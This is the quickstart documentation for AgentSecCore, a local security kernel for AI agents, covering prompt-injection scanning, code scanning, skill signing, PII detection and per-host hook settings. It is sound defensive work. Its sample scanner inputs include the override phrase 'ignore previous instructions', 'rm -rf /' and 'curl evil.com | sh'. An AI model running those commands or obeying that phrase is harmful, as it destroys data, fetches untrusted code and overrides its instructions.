# AgentSecCore

[中文版](../../../zh/agent-security/agent-sec-core/QUICKSTART.md)

AgentSecCore is an all-local security kernel for AI Agents. It runs entirely on the local machine with zero Token consumption, providing defense-in-depth: prompt injection detection, code scanning, skill integrity verification, PII detection, system hardening, and sandbox isolation.

For the Rust V2 SkillSec core migration, see the [V2 guide](skillsec-v2.md).
The release installation and Agent integrations below describe V1.

## Overview

| Module | Description |
|--------|-------------|
| Prompt Scanner | Rule engine + ML classifier detecting prompt injection and jailbreak (4 modes: fast/standard/strict/multi_turn) |
| Code Scanner | Static analysis of bash/python code for dangerous operations (verdict: pass/warn/deny/error) |
| Skill Ledger | Ed25519-signed integrity tracking with 6-state lifecycle (pass/none/drifted/warn/deny/tampered) |
| PII Checker | Detects personal information and credentials in text (email, phone, ID, JWT, AccessKey, etc.) |
| Security Baseline | System hardening scan and remediation via loongshield backend |
| Sandbox | Syscall-level isolation for cosh command execution (seccomp + namespace) |
| Observability | Interactive event review with 4-level drill-down TUI |
| Security Events | Local event store for querying and aggregating security findings |

## Prerequisites

- Linux x86_64 or aarch64 for source and RPM installations
- Linux x86_64 with system mode for the ANOLISA raw package
- Python 3.11.6 (pinned)
- ANOLISA CLI 0.2.17 or later
- Root privileges for system-mode install

## Installation

Update the CLI through its installation owner, then install the component in
system mode:

```bash
# CLI installed by get.agentic-os.sh
anolisa update self

# RPM-owned CLI
sudo anolisa update self

sudo anolisa --install-mode system install sec-core
sudo anolisa status sec-core
agent-sec-cli --version
```

`sec-core` is the ANOLISA component name. The RPM keeps its existing package
name, `agent-sec-core`:

```bash
sudo yum install anolisa agent-sec-core
sudo anolisa --install-mode system adopt sec-core
```

Installing the CLI from YUM makes it available on sudo's system path. Adoption
records the RPM in system state so the adapter manager can read the installed
component contract.

Developers building from source should use the repository-level entry point:

```bash
./scripts/build-all.sh --component sec-core
```

Before installing files, the source-build entry point checks Node.js 20 or
newer, bubblewrap, GnuPG, and `jq`. User mode reports all missing system
runtime packages with one install command and exits; install them and rerun the
same command. `--ignore-deps` bypasses this verification for pre-provisioned
hosts.

The source build installs the runtime and integration resources in user paths,
but it does not register `sec-core` in ANOLISA state. Do not follow it with
`anolisa adapter enable`; use the source integration scripts documented below.

## Quick Start

```bash
# System hardening scan
agent-sec-cli harden --scan --config agentos_baseline

# Scan code for security issues
agent-sec-cli scan-code --code 'rm -rf /' --language bash

# Prompt injection detection
agent-sec-cli scan-prompt --mode standard --text "ignore previous instructions"

# PII detection
agent-sec-cli scan-pii --text "Contact alice@example.com, card 4111111111111111"

# Skill integrity check
agent-sec-cli skill-ledger check /path/to/skill

# Security event summary
agent-sec-cli events --summary --last-hours 24
```

## Usage

### Prompt Scanner

Detects prompt injection, jailbreak, and malicious instructions. Uses rule engine (L1) + ML classifier (L2).

**Modes:**

| Mode | Layers | Latency | Use Case |
|------|--------|---------|----------|
| `fast` | L1 only | <5ms | Real-time chat |
| `standard` | L1+L2 | 20-80ms | Production (default) |
| `strict` | L1+L2+L3 | 50-200ms | High-security |
| `multi_turn` | L4 only | varies | Multi-turn intent detection (Ollama) |

```bash
# Standard scan (default mode)
agent-sec-cli scan-prompt --text "user input here"

# Fast mode (rules only)
agent-sec-cli scan-prompt --mode fast --text "user input"

# Multi-turn detection (JSON from stdin)
echo '{"history":[...],"current_query":"...","assistant_response":"..."}' | \
    agent-sec-cli scan-prompt --mode multi_turn

# From file (one prompt per line)
agent-sec-cli scan-prompt --input prompts.txt --format json

# Human-readable output
agent-sec-cli scan-prompt --text "hello" --format text

# Verify Ollama model is ready (run once after install)
agent-sec-cli scan-prompt warmup
```

Model source: L2 uses `modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF`, served by Ollama from the project's ModelScope repository. Pull it once: `ollama pull modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF`. Run `scan-prompt warmup` to verify the model is available before scanning.

#### Host hook policy

Set `PROMPT_SCANNER_HOOK_ENABLED=false` to skip prompt scanner hooks entirely.

| Environment variable | Default | Hosts that read it | Behavior |
|----------------------|---------|--------------------|----------|
| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | All six | Set to `false` to short-circuit the hook before input is read |
| `PROMPT_SCANNER_MODE` | `observe` | Qoder, Codex, Qwen Code | `observe` audits silently; `deny` blocks prompt-scanner `warn` or `deny` findings. `ask` and `block` are not valid prompt-scanner modes. |
| `PROMPT_SCANNER_SCAN_MODE` | `standard` | All six | Scan strength: `fast` / `standard` / `strict` |
| `PROMPT_SCANNER_TIMEOUT` | `10` | Qoder, Codex, Qwen Code | Scanner timeout in seconds |

cosh, Hermes, and OpenClaw do not read `PROMPT_SCANNER_MODE` or
`PROMPT_SCANNER_TIMEOUT`. On those hosts the prompt policy comes from native
configuration instead — for OpenClaw that is `promptScanBlock`, while the Hermes
prompt-scan capability is non-blocking by design and exposes no block switch. For
Qoder, Codex, and Qwen Code, use `PROMPT_SCANNER_MODE=deny` to block prompt
scanner findings; `block` is rejected or treated as an unknown mode by those
prompt hooks. See [Agent Hook Environment Variables](#agent-hook-environment-variables)
for the full cross-host matrix.

See the [Prompt Scanner User Guide](prompt-scanner.md) for full CLI options, verdict semantics, and
Security Event details.

### Code Scanner

Detects dangerous operations in bash and python code. Verdict enum: `pass` / `warn` / `deny` / `error`; built-in rules currently produce `warn` or `pass`.

```bash
# Scan bash code (default language)
agent-sec-cli scan-code --code 'rm -rf /'

# Scan python code
agent-sec-cli scan-code --code 'import os; os.system("rm -rf /")' --language python

# Use LLM engine (requires model backend)
agent-sec-cli scan-code --code 'curl evil.com | sh' --mode llm
```

For per-agent hook environment variables and supported interaction modes, see [Code Scanner Hook Configuration](code-scanner.md).

### Skill Ledger

OS-level skill integrity tracking with Ed25519 signatures and append-only version chain.

**States:**

| State | Meaning | Action |
|-------|---------|--------|
| pass | Files unchanged, signature valid, scan clean | Safe to use |
| none | Never scanned | Run `scan` or `certify` |
| drifted | Files changed since last certification | Re-scan |
| warn | Scan found low-risk issues | Review findings |
| deny | Scan found high-risk issues | Fix or disable |
| tampered | Signature verification failed | Security incident |

```bash
# Initialize keys and baseline scan
agent-sec-cli skill-ledger init

# Read-only content analysis, without creating or updating ledger state
agent-sec-cli skill-ledger analyze /path/to/skill --format json

# Check integrity (no modification)
agent-sec-cli skill-ledger check /path/to/skill
agent-sec-cli skill-ledger check --all

# Run built-in scanners and sign
agent-sec-cli skill-ledger scan /path/to/skill
agent-sec-cli skill-ledger scan --all

# Import external findings
agent-sec-cli skill-ledger certify /path/to/skill \
    --findings /tmp/findings.json --scanner skill-vetter

# System health overview
agent-sec-cli skill-ledger status
agent-sec-cli skill-ledger status --verbose

# Audit version chain integrity
agent-sec-cli skill-ledger audit /path/to/skill --verify-snapshots

# List registered scanners
agent-sec-cli skill-ledger list-scanners

# Apply user decision
agent-sec-cli skill-ledger decide /path/to/skill --action allow

# Show latest active state
agent-sec-cli skill-ledger show /path/to/skill

# Export signed snapshot for review
agent-sec-cli skill-ledger export /path/to/skill --output /tmp/export/
```

Signing keys live under `~/.local/share/agent-sec/skill-ledger/`.

#### Try the pre-use check in Qoder

The Qoder adapter checks signed status before a local `Skill` Tool invocation.
Use a deterministic test Skill to see `pass`, `drifted`, and `deny`, then cancel
the invocation before the changed instructions run.

[Open the complete Qoder Skill Ledger demo](./qoder-skill-ledger-demo.md)

### PII Checker

Detects personal information and credentials in text input.

```bash
# Scan text directly
agent-sec-cli scan-pii --text "Contact alice@example.com" --source manual

# Scan from stdin
echo "my key is AKID1234567890" | agent-sec-cli scan-pii --stdin --format json

# Scan from file
agent-sec-cli scan-pii --input ./sample.log --source user_input

# With redacted output
agent-sec-cli scan-pii --text "card 4111111111111111" --redact-output

# Include low-confidence findings
agent-sec-cli scan-pii --text "some text" --include-low-confidence
```

#### Host hook policy

All six hosts scan with the PII checker. It runs in observe-only, fail-open mode by
default; raw scan content is passed to `scan-pii` only through stdin, and notices
use only redacted evidence.

| Environment variable | Default | Hosts that read it | Behavior |
|----------------------|---------|--------------------|----------|
| `PII_CHECKER_HOOK_ENABLED` | `true` | All six | Set to `false` to skip the PII hook before input is read |
| `PII_CHECKER_MODE` | `observe` | All six | `observe` audits silently; `warn` warns; `ask`/`block` use host-specific enforcement or fallback; `debug` aliases `observe`, and `deny` aliases `block` |
| `PII_CHECKER_TIMEOUT` | `5` | Qoder, Codex, Qwen Code | Scanner timeout in seconds; Qwen Code caps it at 8 seconds |
| `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | Qoder, Qwen Code | Passes `--include-low-confidence` when enabled |
| `PII_CHECKER_ENABLED` | - | Qwen Code only | Legacy enabled variable, used only when `PII_CHECKER_HOOK_ENABLED` is absent |

#### Qwen Code enforcement boundary

The Qwen Code extension scans user prompts, tool inputs, successful and failed tool
outputs, and final model output.

```bash
# Enable the extension, then start Qwen Code with blocking enabled
anolisa adapter enable sec-core qwencode
PII_CHECKER_MODE=block qwen
```

User prompts and tool inputs can be stopped before execution. For a successful tool call,
`PostToolUse` runs after side effects have occurred, but Qwen Code 0.19.9 consumes
`continue:false` and converts the normal result into a hook-stopped error before downstream
handling. It cannot undo the tool's side effects. `PostToolUseFailure` does not consume
blocking fields in that version, so failed outputs are scan-and-audit only and remain in the
existing error flow. A denied final model output receives one rewrite attempt; a repeated
`Stop` hook is not blocked again, preventing retry loops. Qwen Code does not currently
provide a pre-render output replacement hook, so model-output blocking is best effort.

### Security Baseline

System hardening via `agent-sec-cli harden` (wraps loongshield seharden on Alinux).

```bash
# Compliance scan (default: agentos_baseline profile)
agent-sec-cli harden --scan --config agentos_baseline

# Preview remediation (dry run)
agent-sec-cli harden --reinforce --dry-run --config agentos_baseline

# Execute remediation (requires root)
agent-sec-cli harden --reinforce --config agentos_baseline

# OpenClaw-specific baseline
agent-sec-cli harden --scan --level openclaw

# Show full downstream help
agent-sec-cli harden --downstream-help
```

### Observability

Interactive event review tool for auditing Agent behavior.

All six integrations enable their observability hooks by default. To disable hook
recording, set `OBSERVABILITY_HOOK_ENABLED=false` before starting the host and
restart the host after changing it. The variable accepts only `true` / `false`
(ignoring case and surrounding whitespace); an unset or invalid value keeps
recording enabled.

`OBSERVABILITY_TIMEOUT` sets the timeout in seconds for each local PII
redaction and observability record CLI call. The five non-Hermes integrations
default to `5`; an unset, empty, invalid, or non-positive value also uses `5`.
Hermes instead falls back to its observability capability `timeout`, bounded to
at most `5`. Every integration caps a valid environment value above `5` at `5`.

For OpenClaw and Hermes, the existing observability capability `enabled` setting
is an independent gate. Either switch can disable recording;
`OBSERVABILITY_HOOK_ENABLED=true` does not override a capability disabled in
plugin configuration.

```bash
export OBSERVABILITY_HOOK_ENABLED=false
export OBSERVABILITY_TIMEOUT=5
```

```bash
# Open interactive TUI (requires interactive terminal)
agent-sec-cli observability review

# Record an observability event (from plugin, via stdin)
echo '{"hook":"before_tool_call",...}' | agent-sec-cli observability record --stdin

# Print observability record JSON schema
agent-sec-cli observability schema

# Per-session debrief report
agent-sec-cli observability report --last
agent-sec-cli observability report --session-id <id> --format json
```

### Security Events

Query the local security event store.

```bash
# Recent events (table format, default)
agent-sec-cli events --last-hours 24

# JSON output
agent-sec-cli events --last-hours 24 --output json

# Filter by category
agent-sec-cli events --category prompt_scan

# Filter by time range
agent-sec-cli events --since 2026-01-01T00:00:00 --until 2026-01-02T00:00:00

# Count events
agent-sec-cli events --count --last-hours 24

# Breakdown by category
agent-sec-cli events --count-by category --last-hours 24

# Pagination
agent-sec-cli events --offset 50 --limit 20

# Security posture summary
agent-sec-cli events --summary
```

### Agent Capability View

`agent-sec-cli capabilities` shows the hook capability view for Qoder, Qwen Code, Codex, Cosh, OpenClaw, and Hermes derived from environment variables visible to the current CLI process. It is not a runtime health check and does not prove that hooks are loaded, registered, or currently effective in the target Agent process.

Run the command from the same shell/container/service environment that starts the target Agent when you want the closest approximation. The command does not read OpenClaw, Hermes, or other Agent configuration files, and it does not resolve Agent home directories; Agent config values such as enabled flags, policies, and timeouts can still make runtime behavior differ from this view.

```bash
# All agents and all capabilities
agent-sec-cli capabilities

# By agent
agent-sec-cli capabilities --agent openclaw

# By capability
agent-sec-cli capabilities --capability prompt-scan

# By agent and capability
agent-sec-cli capabilities --agent hermes --capability code-scan

# Machine-readable output
agent-sec-cli capabilities --agent qwen --capability pii-check --output json
```

Supported capability names are exactly `code-scan`, `prompt-scan`, `pii-check`, `skill-ledger`, and `observability`; plugin-internal IDs such as `scan-code`, `prompt-scan-user-input`, or `pii-scan-user-input` are rejected. Table output is grouped by Agent and includes only `CAPABILITY`, `ENABLED`, `MODE`, `SCAN_MODE`, `TIMEOUT(s)`, and `DIAGNOSTICS`; `MODE` is the hook interaction mode, while `SCAN_MODE` is the prompt scanner engine mode (`fast`, `standard`, or `strict`). JSON output uses the same user-facing fields and sanitized `env` entries containing only `effective` and `default` values. Neither format exposes hook matcher lists, source labels, Agent config contents, config paths, or raw environment variable values. Diagnostics name the invalid setting and fallback behavior without echoing the original value.

The configured L2 backend is the one deliberate exception: a model name is only useful verbatim, so `PROMPT_SCANNER_L2_MODEL` is reported case-preserved (escaped and length-capped) as an `env` entry of `prompt-scan`. Its `default` — and the `effective` value when the variable is unset — is the default backend reported by the native scanner engine, and a name no backend supports is reported as configured plus a diagnostic, because the engine rejects it at construction and scans then fail rather than falling back. Because host hooks are fail-open on a failed scan, this diagnostic is usually the only place the misconfiguration is visible before prompts start flowing unscanned. It has no table column, so read it with `--capability prompt-scan --output json`.

View source and limits:

- Source: static hook capability metadata plus environment variables visible to the current CLI process.
- Not included: OpenClaw, Hermes, or other Agent configuration files; Agent home directories; live hook loading or registration state.
- Known drift: running the command from a different shell/container/service or with different Agent config can produce output that differs from real Agent runtime behavior.
- Known drift: the L2 backend default and the unsupported-backend check come from the native scanner engine, so before the extension is built the view reports an empty `PROMPT_SCANNER_L2_MODEL` default and cannot flag an unsupported name.

## Agent Hook Environment Variables

Every host reads `<CAPABILITY>_HOOK_ENABLED` (`true` / `false`, case-insensitive,
surrounding whitespace ignored). An unset or invalid value keeps the hook
enabled. For capabilities that use the shared hook policy parser,
`<CAPABILITY>_MODE` selects how findings are surfaced; `debug` is an alias for
`observe` and `deny` is an alias for `block`. Prompt Scanner is narrower:
`PROMPT_SCANNER_MODE` accepts only `observe` and `deny`. Hosts read these
variables when they load the plugin, so restart the host after changing them.

**Not every variable is honored by every host.** This table reflects what the
adapter code actually reads (✓ = read by that host, ✗ = not read):

| Variable | Default | cosh | Qoder | Codex | Qwen Code | Hermes | OpenClaw |
|----------|---------|------|-------|-------|-----------|--------|----------|
| `CODE_SCANNER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `CODE_SCANNER_MODE` | `observe` (cosh: `ask`) | ✓ (only `ask`) | ✓ | ✓ | ✓ | ✓ | ✓ |
| `CODE_SCANNER_TIMEOUT` | `10` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PROMPT_SCANNER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PROMPT_SCANNER_MODE` | `observe` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PROMPT_SCANNER_SCAN_MODE` | `standard` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PROMPT_SCANNER_L2_MODEL` | unset (Qwen3Guard) | ✓* | ✓* | ✓* | ✓* | ✓* | ✓* |
| `PROMPT_SCANNER_TIMEOUT` | `10` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PII_CHECKER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PII_CHECKER_MODE` | `observe` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `PII_CHECKER_TIMEOUT` | `5` | ✗ | ✓ | ✓ | ✓ | ✗ | ✗ |
| `PII_CHECKER_INCLUDE_LOW_CONFIDENCE` | `false` | ✗ | ✓ | ✗ | ✓ | ✗ | ✗ |
| `PII_CHECKER_ENABLED` (legacy) | — | ✗ | ✗ | ✗ | ✓ | ✗ | ✗ |
| `SKILL_LEDGER_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `SKILL_LEDGER_MODE` | `ask` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `SKILL_LEDGER_TIMEOUT` | `5` | ✗ | ✓ | ✓ | ✗ | ✗ | ✗ |
| `OBSERVABILITY_HOOK_ENABLED` | `true` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| `OBSERVABILITY_TIMEOUT` | `5` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

`PROMPT_SCANNER_L2_MODEL` is marked `✓*` because no adapter reads it directly:
every host shells out to `agent-sec-cli scan-prompt`, which resolves the L2
backend, so all six inherit whatever the host process environment carries. A
blank or whitespace-only value means "not set" and keeps the built-in Qwen3Guard
backend; any other unsupported name makes the scan fail at engine construction
instead of silently disabling L2 — but because every host hook is fail-open on a
non-zero `scan-prompt` exit, that failure is only audited and never blocks, so the
host runs without prompt scanning until the name is fixed. See
[Prompt Scanner](prompt-scanner.md) for the selectable backends.

The matrix default is `5`, matching the five non-Hermes integrations and the
bundled Hermes configuration. For Hermes, an unset, empty, invalid, or
non-positive `OBSERVABILITY_TIMEOUT` falls back to the observability capability
`timeout`, bounded to at most `5`; a lower configured value therefore remains
effective. Every integration caps a valid environment value above `5` at `5`.

Where a variable is not read by a host, that host's native configuration governs
the behavior. For example OpenClaw takes its prompt policy from
`promptScanBlock` and its code-scan policy from `codeScanRequireApproval`, while
Hermes uses `enable_block` for `code-scan` and `policy` for `pii-scan-user-input`.
The Hermes `prompt-scan-user-input` capability has no block switch at all.

For Hermes and OpenClaw, the capability `enabled` setting remains an independent
gate. Either switch can disable a hook; setting `<CAPABILITY>_HOOK_ENABLED=true`
does not re-enable a capability that plugin configuration has disabled.
`PII_CHECKER_ENABLED` is a Qwen Code legacy fallback only: Qwen Code reads it
only when `PII_CHECKER_HOOK_ENABLED` is absent, and all other hosts ignore it.

Per-host Code Scanner mode semantics and fallback behavior:
[Code Scanner Hook Configuration](code-scanner.md).

## Agent Framework Integration

For an ANOLISA-managed raw package or an adopted RPM, installation places the
available adapters but does not change an agent framework's user configuration.
Run adapter commands as the user who owns that framework's configuration:

```bash
anolisa adapter scan
anolisa adapter enable sec-core openclaw
```

Replace `openclaw` with `hermes`, `qwencode`, `cosh`, `codex`, or `qoder` for
the other packaged integrations.

### Source-build Integration

The default source build installs the cosh extension directly under
`~/.copilot-shell/extensions/agent-sec-core`, so no separate cosh enable step
is needed. Deploy another integration with its installed user-path script:

```bash
# OpenClaw
bash ~/.local/lib/anolisa/sec-core/openclaw-plugin/scripts/deploy.sh

# Hermes
bash ~/.local/lib/anolisa/sec-core/hermes-plugin/scripts/deploy.sh

# Qwen Code
bash ~/.local/lib/anolisa/sec-core/qwen-code-extension/scripts/deploy.sh

# Codex
bash ~/.local/lib/anolisa/sec-core/codex-plugin/install.sh

# Qoder
bash ~/.local/lib/anolisa/sec-core/qoder-plugin/install.sh
```

### OpenClaw

Enable the adapter with ANOLISA:

```bash
anolisa adapter enable sec-core openclaw
```

After deployment, configure:

```bash
# Enable prompt scan blocking
openclaw config set plugins.entries.agent-sec.config.promptScanBlock true

# Enable code scan approval mode
openclaw config set plugins.entries.agent-sec.config.codeScanRequireApproval true

# Restart gateway to load
openclaw gateway restart
```

### Hermes

Enable the adapter with ANOLISA:

```bash
anolisa adapter enable sec-core hermes
```

Plugin config at `~/.hermes/plugins/agent-sec-core-hermes-plugin/config.toml`:

```toml
[capabilities.code-scan]
enabled = true
timeout = 10
enable_block = false    # false=observe, true=block

[capabilities.pii-scan-user-input]
enabled = true
timeout = 10
policy = "observe"      # observe (default) | block
include_low_confidence = false

[capabilities.prompt-scan-user-input]
enabled = true
timeout = 15

[capabilities.observability]
enabled = true
timeout = 5

[capabilities.skill-ledger]
enabled = true
timeout = 5
policy = "observe"      # observe (default) | block
```

`timeout` is a required key for every Hermes capability. `prompt-scan-user-input`
is audit-only and does not register `transform_llm_output`; it has no `enable_block`
or `policy` field. Hermes maps legacy `warn` / `ask` policies for PII Checker and
Skill Ledger to `observe` with a host diagnostic. Hermes does not register a PII
model-output transform; it audits model output at `post_llm_call`, while `block` applies only at
the native `pre_tool_call` boundary.
The `timeout = 15` value is Hermes capability configuration, not
`PROMPT_SCANNER_TIMEOUT`; Hermes does not read the prompt scanner timeout environment
variable.

### Qwen Code

Enable the user-scoped extension with ANOLISA:

```bash
anolisa adapter enable sec-core qwencode
```

The synchronous `PreToolUse` hook protects only model-triggered Qwen Code
`skill` Tool calls for managed project (`.qwen/skills`) and user
(`$QWEN_HOME/skills`, defaulting to `~/.qwen/skills`) skills. Scan or certify
each skill first; these commands best-effort add its directory to
`managedSkillDirs`:

```bash
agent-sec-cli skill-ledger scan .qwen/skills/<skill>
agent-sec-cli skill-ledger scan "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
agent-sec-cli skill-ledger show .qwen/skills/<skill>
agent-sec-cli skill-ledger show "${QWEN_HOME:-$HOME/.qwen}/skills/<skill>"
```

`show` returns `managed=false` only for an unmanaged Skill; a normal exposure
summary without that marker is managed. Unmanaged skills always fail open,
including when blocking is enabled. The default policy is `ask`; set the policy
in the trusted environment that starts Qwen Code:

```bash
SKILL_LEDGER_MODE=observe qwen  # observe only
SKILL_LEDGER_MODE=warn qwen   # emit a non-blocking diagnostic; continue
SKILL_LEDGER_MODE=ask qwen    # ask before use (default)
SKILL_LEDGER_MODE=block qwen  # deny a non-empty exposure warning
```

Qwen Code 0.19.9 records non-blocking `systemMessage` values in the session debug log
but does not render them in its TTY; native `permissionDecision=ask/deny` and
enforceable `block` decisions are unaffected.

The hook follows the existing Skill Ledger exposure message, including prior
`decide` actions. Normal `pass` and `warn` states are allowed; managed `none`,
`drifted`, `deny`, and `tampered` states can warn, ask, or block when their
exposure message is non-empty. `ask` falls back to denial in Qwen Code contexts
that cannot prompt, such as headless runs and background subagents.

Only disk skills that Qwen Code exposes to the model enter Ledger validation.
A disk skill hidden by `disable-model-invocation` or `skills.disabled` fails
open so its Ledger state cannot block a same-named file command or MCP prompt.
Unreadable or invalid Qwen settings also fail open because the public hook input
does not identify the final dispatch source.

The protection boundary intentionally excludes direct `/skill-name` and stacked
slash-skill expansion, extension skills, `.agents/skills`, bundled skills, and
symlinks whose targets leave the corresponding `.qwen/skills` root. Missing CLI
or keys, initialization failure, inaccessible or ambiguous paths or settings,
timeouts, and invalid output are diagnosed and fail open. There is no startup
preflight, background scan, cache, or automatic configuration repair.

### Codex

Enable the adapter with ANOLISA:

```bash
anolisa adapter enable sec-core codex
```

The adapter registers `agent-sec-core` as a Codex plugin through the bundled
`agent-sec` marketplace, so `codex` and `agent-sec-cli` must both be on `PATH`
before enabling it. The registered hooks are:

| Codex hook | Checks |
|------------|--------|
| `UserPromptSubmit` | prompt scanner, PII checker, Skill Ledger, observability |
| `PreToolUse` | code scanner (`Bash` matcher), PII checker, observability |
| `PostToolUse` | PII checker, observability |
| `Stop` | observability |

Codex supports `observe` and `block` for `CODE_SCANNER_MODE`; `ask` is treated as
unset. Its prompt scanner is separate and accepts only `observe` or `deny`; use
`PROMPT_SCANNER_MODE=deny` for prompt blocking. Set the policy in the environment
that starts Codex:

```bash
CODE_SCANNER_MODE=block PROMPT_SCANNER_MODE=deny PII_CHECKER_MODE=block codex
```

### Qoder

Enable the adapter with ANOLISA:

```bash
anolisa adapter enable sec-core qoder
```

The adapter installs a Qoder CLI plugin via `qodercli plugins install`. Restart
Qoder CLI or run `/plugins reload` afterwards. The registered hooks are:

| Qoder hook | Checks |
|------------|--------|
| `UserPromptSubmit` | observability, PII checker, prompt scanner |
| `PreToolUse` | observability, Skill Ledger (`Skill` matcher), code scanner (`Bash` matcher), PII checker |
| `PostToolUse` | observability, PII checker |
| `PostToolUseFailure` | observability |
| `Stop` / `StopFailure` | observability |

The Skill Ledger hook resolves user Skills from `~/.qoder/skills/` before project
Skills from `<cwd>/.qoder/skills/`, runs a read-only `skill-ledger check`, and
applies `SKILL_LEDGER_MODE` (default `ask`). Each check carries Qoder trace
identifiers into the security audit log.

Qoder supports `observe`, `ask`, and `block` for `CODE_SCANNER_MODE`. Its prompt
scanner is separate and accepts only `observe` or `deny`; use
`PROMPT_SCANNER_MODE=deny` for prompt blocking:

```bash
CODE_SCANNER_MODE=ask PROMPT_SCANNER_MODE=deny SKILL_LEDGER_MODE=block qoder
```

### Copilot Shell (cosh)

For a package install, enable the adapter in the target user's configuration:

```bash
anolisa adapter enable sec-core cosh
```

Hooks are loaded when cosh starts.

Extension path:
- User install: `~/.copilot-shell/extensions/agent-sec-core/`
- RPM install: `/usr/share/anolisa/extensions/agent-sec-core/`

## FAQ

**Q: Does AgentSecCore consume Tokens?**

A: No. All processing is local. No external API calls, no Token cost.

**Q: What is the difference between `harden` and `loongshield`?**

A: `agent-sec-cli harden` is the ANOLISA unified entry point that wraps `loongshield seharden` with default configuration. On Alinux systems, both work; `harden` adds the `agentos_baseline` profile by default.

**Q: How do I update the ML model for prompt scanning?**

A: Run `ollama pull modelscope.cn/ANOLISA/Qwen3Guard-Gen-0.6B-GGUF` to fetch the
current model, then run `agent-sec-cli scan-prompt warmup` to verify that Ollama
can serve it. `warmup` never downloads models automatically.

**Q: What does Skill Ledger `tampered` mean?**

A: Files are unchanged but the digital signature verification failed — the manifest metadata itself may have been modified. Stop using the skill immediately and investigate.
